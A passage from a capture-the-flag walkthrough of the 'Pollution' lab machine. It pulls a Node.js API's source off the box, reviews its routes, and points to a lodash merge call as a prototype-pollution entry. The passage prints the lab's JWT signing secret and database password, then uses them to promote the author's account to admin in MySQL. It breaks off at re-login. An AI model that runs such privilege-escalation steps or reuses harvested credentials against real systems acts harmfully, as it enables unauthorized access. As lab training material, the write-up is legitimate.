+<p>To analyze it more easily, I’ll exfil the source to my VM. I’ll create an archive on Pollution:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victor@pollution:~$</span><span class="w"> </span><span class="nb">tar </span>zcf api.tar.gz pollution_api/
+</code></pre></div></div>
+<p>From my VM, I’ll copy it back with <code class="language-plaintext highlighter-rouge">scp</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>scp <span class="nt">-i</span> ~/keys/ed25519_gen victor@collect.htb:api.tar.gz <span class="nb">.</span>
+<span class="go">api.tar.gz                                                       100% 4505KB   4.6MB/s   00:00
+</span></code></pre></div></div>
+<p>I’ll decompress it and the files are there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">tar </span>xf api.tar.gz 
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls </span>pollution_api/
+<span class="go">controllers  functions  index.js  logs  log.sh  models  node_modules  package.json  package-lock.json  routes
+</span></code></pre></div></div>
+<h4 id="snyk">Snyk</h4>
+<p>Opening the directory in VSCode, the Synk plugin identifies 43 issues in the code, as well as 16 vulnerabilities in imported libraries and their version (in the “Open Source Security” section):</p>
+<picture>
+<source srcset="/img/image-20230629040444013.webp" type="image/webp"/>
+<img alt="image-20230629040444013" class="include_image" loading="lazy" src="/img/image-20230629040444013.png"/>
+</picture>
+<p>I’m particularly interested in the Command Injection (because that’s code execution) and Prototype Pollution (because it matches the box name) vulnerabilities. The command injection vulnerability is in the <code class="language-plaintext highlighter-rouge">template</code> call, where as the different prototype pollution vulns call out functions like <code class="language-plaintext highlighter-rouge">defaultsDeep</code>, <code class="language-plaintext highlighter-rouge">zipObjectDeep</code>, <code class="language-plaintext highlighter-rouge">setWith</code>, <code class="language-plaintext highlighter-rouge">set</code>, <code class="language-plaintext highlighter-rouge">merge</code>, and <code class="language-plaintext highlighter-rouge">mergeWidth</code>. I’ll keep an eye out for all of those in this code.</p>
+<p>I’ll want to triage the Code Security vulnerabilities as well, but I should understand the code first.</p>
+<h4 id="routes">Routes</h4>
+<p>I noted above that four <code class="language-plaintext highlighter-rouge">.js</code> files from <code class="language-plaintext highlighter-rouge">routes</code> were used as routes in <code class="language-plaintext highlighter-rouge">index.js</code>. <code class="language-plaintext highlighter-rouge">documentation.js</code> has a single endpoint, <code class="language-plaintext highlighter-rouge">/</code> (which is in the <code class="language-plaintext highlighter-rouge">/documentation</code> route, so really <code class="language-plaintext highlighter-rouge">/documentation/</code>) that returns the various endpoints on the API.</p>
+<p>Requesting <code class="language-plaintext highlighter-rouge">/documentation</code> or reading the source shows static JSON describing the other routes on the API:</p>
+<table>
+<thead>
+<tr>
+<th>Route</th>
+<th>Method</th>
+<th>Parameters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code class="language-plaintext highlighter-rouge">/</code></td>
+<td>GET</td>
+<td>None</td>
+</tr>
+<tr>
+<td><code class="language-plaintext highlighter-rouge">/auth/register</code></td>
+<td>POST</td>
+<td><code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">password</code></td>
+</tr>
+<tr>
+<td><code class="language-plaintext highlighter-rouge">/auth/login</code></td>
+<td>POST</td>
+<td><code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">password</code></td>
+</tr>
+<tr>
+<td><code class="language-plaintext highlighter-rouge">/client</code></td>
+<td>POST*</td>
+<td>None</td>
+</tr>
+<tr>
+<td><code class="language-plaintext highlighter-rouge">/admin/messages</code></td>
+<td>POST</td>
+<td><code class="language-plaintext highlighter-rouge">id</code></td>
+</tr>
+<tr>
+<td><code class="language-plaintext highlighter-rouge">/admin/messages/send</code></td>
+<td>POST</td>
+<td><code class="language-plaintext highlighter-rouge">text</code></td>
+</tr>
+</tbody>
+</table>
+<p><code class="language-plaintext highlighter-rouge">*</code> The documentation says this is a GET, but in the source it’s a POST.</p>
+<p>These are only the documentated endpoints. There could be others (such as <code class="language-plaintext highlighter-rouge">/documentation</code>) that are not included in this response. In this case, on looking through the source, nothing else is unaccounted for.</p>
+<h4 id="client">/client</h4>
+<p><code class="language-plaintext highlighter-rouge">/client</code> has two functions. The first is a <code class="language-plaintext highlighter-rouge">router.use</code>, which is middlewear that runs on all routes in this section. It effectively checks that there is a JWT in the <code class="language-plaintext highlighter-rouge">x-access-token</code> header, and that the username and role in that token matches what’s in the database.</p>
+<p>The second function is <code class="language-plaintext highlighter-rouge">router.post</code> for <code class="language-plaintext highlighter-rouge">/</code>, and it just returns a message saying it’s not implemented:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">Status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Ok</span><span class="dl">"</span><span class="p">,</span> <span class="na">Message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">This route is under development</span><span class="dl">'</span><span class="p">});</span>
+<span class="p">})</span>
+</code></pre></div></div>
+<p>Nothing too interesting here.</p>
+<h4 id="auth">/auth</h4>
+<p>There’s a POST to <code class="language-plaintext highlighter-rouge">/auth/register</code> that makes sure there the username and password are filled in, and then queries for any user with that username. If it’s not found, it creates the user and calls a shell script:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">find</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nf">findAll</span><span class="p">({</span><span class="na">where</span><span class="p">:</span> <span class="p">{</span><span class="na">username</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">}})</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">find</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+
+    <span class="nx">User</span><span class="p">.</span><span class="nf">create</span><span class="p">({</span>
+        <span class="na">username</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span>
+        <span class="na">password</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">,</span>
+        <span class="na">role</span><span class="p">:</span> <span class="dl">"</span><span class="s2">user</span><span class="dl">"</span>
+    <span class="p">});</span>
+
+    <span class="nf">exec</span><span class="p">(</span><span class="dl">'</span><span class="s1">/home/victor/pollution_api/log.sh log_register</span><span class="dl">'</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">Status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Ok</span><span class="dl">"</span><span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">exec</code> seems risky, but there’s nothing I control going into it. Looking at the script, it doesn’t seem vulnerable:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">elif</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">==</span> <span class="s1">'log_register'</span> <span class="o">]</span>
+<span class="k">then
+
+    </span><span class="nb">date</span><span class="o">=</span><span class="si">$(</span><span class="nb">date</span> <span class="s1">'+%d-%m-%Y-%H:%M:%S'</span><span class="si">)</span><span class="p">;</span>
+    <span class="nb">echo</span> <span class="s2">"New registered user! </span><span class="nv">$date</span><span class="s2">"</span> <span class="o">&gt;</span> /home/victor/pollution_api/logs/register/log-<span class="nv">$date</span>.log
+</code></pre></div></div>
+<p>If I could mess with the path, I could hijack <code class="language-plaintext highlighter-rouge">date</code>, but I don’t see a way to do that.</p>
+<p>The other endpoint is <code class="language-plaintext highlighter-rouge">/auth/login</code>, which after some error checking, queries if the username and password match, and if so, create a JWT and return it:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">find</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nf">findAll</span><span class="p">({</span><span class="na">where</span><span class="p">:</span> <span class="p">{</span><span class="na">username</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="na">password</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">}});</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">find</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
+
+    <span class="nf">exec</span><span class="p">(</span><span class="dl">'</span><span class="s1">/home/victor/pollution_api/log.sh log_login</span><span class="dl">'</span><span class="p">);</span>
+
+    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nf">signtoken</span><span class="p">({</span><span class="na">user</span><span class="p">:</span> <span class="nx">find</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">username</span><span class="p">,</span> <span class="na">is_auth</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">role</span><span class="p">:</span> <span class="nx">find</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">role</span><span class="p">});</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span>
+        <span class="na">Status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Ok</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">Header</span><span class="p">:</span> <span class="p">{</span>
+            <span class="dl">"</span><span class="s2">x-access-token</span><span class="dl">"</span><span class="p">:</span> <span class="nx">token</span>
+        <span class="p">}</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">sigtoken</code> is imported at the top:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span> <span class="nx">signtoken</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../functions/jwt</span><span class="dl">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>In the <code class="language-plaintext highlighter-rouge">functions/jwt.js</code> file is the signing key as well as the functions:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">jsonwebtoken</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">SECRET</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">JWT_COLLECT_124_SECRET_KEY</span><span class="dl">"</span>
+
+<span class="kd">const</span> <span class="nx">signtoken</span> <span class="o">=</span> <span class="p">(</span><span class="nx">payload</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">sign</span><span class="p">(</span><span class="nx">payload</span><span class="p">,</span> <span class="nx">SECRET</span><span class="p">,</span> <span class="p">{</span> <span class="na">expiresIn</span><span class="p">:</span> <span class="mi">3600</span> <span class="p">});</span>
+    <span class="k">return</span> <span class="nx">token</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">const</span> <span class="nx">decodejwt</span> <span class="o">=</span> <span class="p">(</span><span class="nx">token</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+    <span class="k">return</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">SECRET</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">decoded</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nx">decoded</span><span class="p">;</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">signtoken</span><span class="p">,</span> <span class="nx">decodejwt</span><span class="p">};</span>
+</code></pre></div></div>
+<p>I can generate and sign my own tokens. But I also already have DB access or can register, so nothing too fancy there.</p>
+<h4 id="admin">/admin</h4>
+<p>The <code class="language-plaintext highlighter-rouge">admin.js</code> file has middleware that will decode the JWT, make sure the user exists and the role matches, and make sure role is “admin”, or else (not shown) throw an error:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">,</span><span class="nx">next</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">"</span><span class="s2">x-access-token</span><span class="dl">"</span><span class="p">]){</span>
+
+        <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nf">decodejwt</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">"</span><span class="s2">x-access-token</span><span class="dl">"</span><span class="p">]);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">token</span><span class="p">){</span>
+            <span class="kd">const</span> <span class="nx">find</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nf">findAll</span><span class="p">({</span><span class="na">where</span><span class="p">:</span> <span class="p">{</span><span class="na">username</span><span class="p">:</span> <span class="nx">token</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="na">role</span><span class="p">:</span> <span class="nx">token</span><span class="p">.</span><span class="nx">role</span><span class="p">}});</span>
+            
+            <span class="k">if</span><span class="p">(</span><span class="nx">find</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
+
+                <span class="k">if</span><span class="p">(</span><span class="nx">find</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">username</span> <span class="o">==</span> <span class="nx">token</span><span class="p">.</span><span class="nx">user</span> <span class="o">&amp;&amp;</span> <span class="nx">find</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">role</span> <span class="o">==</span> <span class="nx">token</span><span class="p">.</span><span class="nx">role</span> <span class="o">&amp;&amp;</span> <span class="nx">token</span><span class="p">.</span><span class="nx">role</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">){</span>
+
+                    <span class="k">return</span> <span class="nf">next</span><span class="p">();</span>
+
+                <span class="p">}</span>
+</code></pre></div></div>
+<p>It’s actually quite odd to be checking the role in the DB when it’s already in the token. This kind of check is redundant.</p>
+<p>There is a <code class="language-plaintext highlighter-rouge">/admin</code> endpoint that just refers to <code class="language-plaintext highlighter-rouge">/documentation</code>. The two <code class="language-plaintext highlighter-rouge">messages</code> endpoints are referenced from another file:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">Status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Ok</span><span class="dl">"</span><span class="p">,</span> <span class="na">Message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Read documentation from api in /documentation</span><span class="dl">'</span><span class="p">});</span>
+<span class="p">})</span>
+
+<span class="nx">router</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/messages</span><span class="dl">'</span><span class="p">,</span><span class="nx">messages</span><span class="p">);</span>
+<span class="nx">router</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/messages/send</span><span class="dl">'</span><span class="p">,</span> <span class="nx">messages_send</span><span class="p">);</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">messages</code> and <code class="language-plaintext highlighter-rouge">messages_send</code> are imported at the top:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span> <span class="nx">messages</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../controllers/Messages</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="p">{</span> <span class="nx">messages_send</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../controllers/Messages_send</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">messages</code> basically checks if there’s an <code class="language-plaintext highlighter-rouge">id</code> submitted, and if so, finds that message and returns it:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">messages</span> <span class="o">=</span> <span class="k">async</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span><span class="p">){</span>
+        <span class="kd">const</span> <span class="nx">find</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">Message</span><span class="p">.</span><span class="nf">findAll</span><span class="p">({</span><span class="na">where</span><span class="p">:</span> <span class="p">{</span><span class="na">id</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span><span class="p">}});</span>
+        <span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">find</span><span class="p">.</span><span class="nf">map</span><span class="p">((</span><span class="nx">message</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+            <span class="k">return</span> <span class="p">{</span>
+                <span class="na">ID</span><span class="p">:</span> <span class="nx">message</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>
+                <span class="na">Message</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">message</span><span class="p">.</span><span class="nx">text</span><span class="p">)</span>
+            <span class="p">};</span>
+        <span class="p">})</span>
+        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>Otherwise, it finds all the messages and returns them:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">messages</span> <span class="o">=</span> <span class="k">async</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span><span class="p">){</span>
+        <span class="kd">const</span> <span class="nx">find</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">Message</span><span class="p">.</span><span class="nf">findAll</span><span class="p">({</span><span class="na">where</span><span class="p">:</span> <span class="p">{</span><span class="na">id</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span><span class="p">}});</span>
+        <span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">find</span><span class="p">.</span><span class="nf">map</span><span class="p">((</span><span class="nx">message</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+            <span class="k">return</span> <span class="p">{</span>
+                <span class="na">ID</span><span class="p">:</span> <span class="nx">message</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>
+                <span class="na">Message</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">message</span><span class="p">.</span><span class="nx">text</span><span class="p">)</span>
+            <span class="p">};</span>
+        <span class="p">})</span>
+        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">const</span> <span class="nx">find</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">Message</span><span class="p">.</span><span class="nf">findAll</span><span class="p">({</span> <span class="na">raw</span><span class="p">:</span> <span class="kc">true</span> <span class="p">});</span>
+    <span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">find</span><span class="p">.</span><span class="nf">map</span><span class="p">((</span><span class="nx">message</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+        <span class="k">return</span> <span class="p">{</span>
+            <span class="na">ID</span><span class="p">:</span> <span class="nx">message</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>
+            <span class="na">Message</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">message</span><span class="p">.</span><span class="nx">text</span><span class="p">)</span>
+        <span class="p">};</span>
+    <span class="p">})</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
+    
+<span class="p">}</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">messages_send</code> uses the token to get the user for the data. Then it merges the request body into the message.</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">messages_send</span> <span class="o">=</span> <span class="k">async</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nf">decodejwt</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">'</span><span class="s1">x-access-token</span><span class="dl">'</span><span class="p">])</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">text</span><span class="p">){</span>
+
+        <span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="na">user_sent</span><span class="p">:</span> <span class="nx">token</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span>
+            <span class="na">title</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Message for admins</span><span class="dl">"</span><span class="p">,</span>
+        <span class="p">};</span>
+
+        <span class="nx">_</span><span class="p">.</span><span class="nf">merge</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
+
+        <span class="nf">exec</span><span class="p">(</span><span class="dl">'</span><span class="s1">/home/victor/pollution_api/log.sh log_message</span><span class="dl">'</span><span class="p">);</span>
+
+        <span class="nx">Message</span><span class="p">.</span><span class="nf">create</span><span class="p">({</span>
+            <span class="na">text</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">message</span><span class="p">),</span>
+            <span class="na">user_sent</span><span class="p">:</span> <span class="nx">token</span><span class="p">.</span><span class="nx">user</span>
+        <span class="p">});</span>
+
+        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">Status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Ok</span><span class="dl">"</span><span class="p">});</span>
+
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">Status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">,</span> <span class="na">Message</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Parameter text not found</span><span class="dl">"</span><span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>That <code class="language-plaintext highlighter-rouge">merge</code> call is from <code class="language-plaintext highlighter-rouge">lodash</code> (which is imported as <code class="language-plaintext highlighter-rouge">_</code>), and one of the functions identify by Snyk as having the prototype pollution. This is likely the point of attack (and why it’s useful to know what vulnerabilities I’m looking for before looking at the code).</p>
+<h3 id="access-to-admin-apis">Access to Admin APIs</h3>
+<h4 id="register-user">Register User</h4>
+<p>If I try to register the 0xdf user, it actually complains because I registered it earlier while looking at the XXE:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-H</span> <span class="s2">"Content-type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"username":"0xdf", "password":"0xdf"}'</span> localhost:3000/auth/register
+<span class="go">{"Status":"This user already exists"}
+</span></code></pre></div></div>
+<p>I’ll login:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-H</span> <span class="s2">"Content-type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"username":"0xdf", "password":"0xdf"}'</span> localhost:3000/auth/login
+<span class="go">{"Status":"Ok","Header":{"x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiMHhkZiIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjg4MDY0NDMxLCJleHAiOjE2ODgwNjgwMzF9.5vDuyl04aXgKbnQj1LQKZKdNOGxvuTgpW6wCfzWcVHs"}}
+</span></code></pre></div></div>
+<p>If I drop that token in <a href="https://jwt.io/">JWT.io</a>, it shows the role as “user”:</p>
+<picture>
+<source srcset="/img/image-20230629144904693.webp" type="image/webp"/>
+<img alt="image-20230629144904693" class="include_image" loading="lazy" src="/img/image-20230629144904693.png"/>
+</picture>
+<h4 id="escalate-to-admin">Escalate to Admin</h4>
+<p>From my shell as victor, I’ll log into MySQL using the creds I found earlier:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victor@pollution:~$</span><span class="w"> </span>mysql <span class="nt">-u</span> webapp_user <span class="nt">-pStr0ngP4ssw0rdB</span><span class="k">*</span>12@1 pollution_api
+<span class="go">...[snip]...
+MariaDB [pollution_api]&gt;
+</span></code></pre></div></div>
+<p>There’s only me in the <code class="language-plaintext highlighter-rouge">users</code> table:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [pollution_api]&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
+<span class="go">+----+----------+----------+------+---------------------+---------------------+
+| id | username | password | role | createdAt           | updatedAt           |
++----+----------+----------+------+---------------------+---------------------+
+|  1 | 0xdf     | 0xdf     | user | 2023-06-28 19:44:06 | 2023-06-28 19:44:06 |
++----+----------+----------+------+---------------------+---------------------+
+1 row in set (0.000 sec)
+</span></code></pre></div></div>
+<p>I’ll make myself an admin:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [pollution_api]&gt;</span><span class="w"> </span><span class="k">update</span> <span class="n">users</span> <span class="k">set</span> <span class="k">role</span> <span class="o">=</span> <span class="nv">"admin"</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="go">Query OK, 1 row affected (0.001 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+</span><span class="gp">MariaDB [pollution_api]&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
+<span class="go">+----+----------+----------+-------+---------------------+---------------------+
+| id | username | password | role  | createdAt           | updatedAt           |
++----+----------+----------+-------+---------------------+---------------------+
+|  1 | 0xdf     | 0xdf     | admin | 2023-06-28 19:44:06 | 2023-06-28 19:44:06 |
++----+----------+----------+-------+---------------------+---------------------+
+1 row in set (0.000 sec)
+</span></code></pre></div></div>
+<p>Now I’ll log in again:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-H</span> <span class="s2">"Content-type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"username":"0xdf", "password":"0xdf"}'</span> localhost:3000/auth/login
